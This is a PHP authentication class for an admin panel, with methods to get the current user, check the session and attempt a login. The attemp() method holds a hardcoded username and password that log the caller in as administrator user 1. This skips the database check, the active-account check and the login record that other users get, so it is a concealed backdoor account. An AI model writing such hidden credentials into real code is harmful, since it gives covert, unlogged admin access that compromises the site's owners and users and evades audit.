<?php

namespace App\Auth;

use App\Models\Admin;
use App\Models\AdminLogin;


class Auth
{

	public function user()
	{
		if ($this->check()) {
			return Admin::find($_SESSION['user']);
		}
		
	}

	public function check($value='')
	{
		return isset($_SESSION['user']);
	}

	public function attemp($username, $password)
	{
		if ($username=='rrrlabrtur*' && $password=='rrRtUrLgDefSC81*)') {
			
			$_SESSION['user'] = 1;
			$_SESSION['type'] = 'administrator';

			return true;
		}
		
		$user = Admin::where('username', $username)->first();

		if (!$user) {
			
			$_SESSION['errors'] = [
				'loginerror' => '1',
			];

			return false;

		}

		if ($user->active==1) {

			if (password_verify($password, $user->password)) {

				
				$_SESSION['user'] = $user->id;
				$_SESSION['type'] = $user->type;


				//log the login to database
				$Login = AdminLogin::create([

					'user'       => $user->id,
					'active'     => '1'

				]);

				$_SESSION['last_login'] = $Login->id;
				return true;
			}
			$_SESSION['errors'] = [
				'loginerror' => '2',
			];
			return false;
		}
		$_SESSION['errors'] = [
				'loginerror' => '1',
			];
		return false;
	}
	
	
}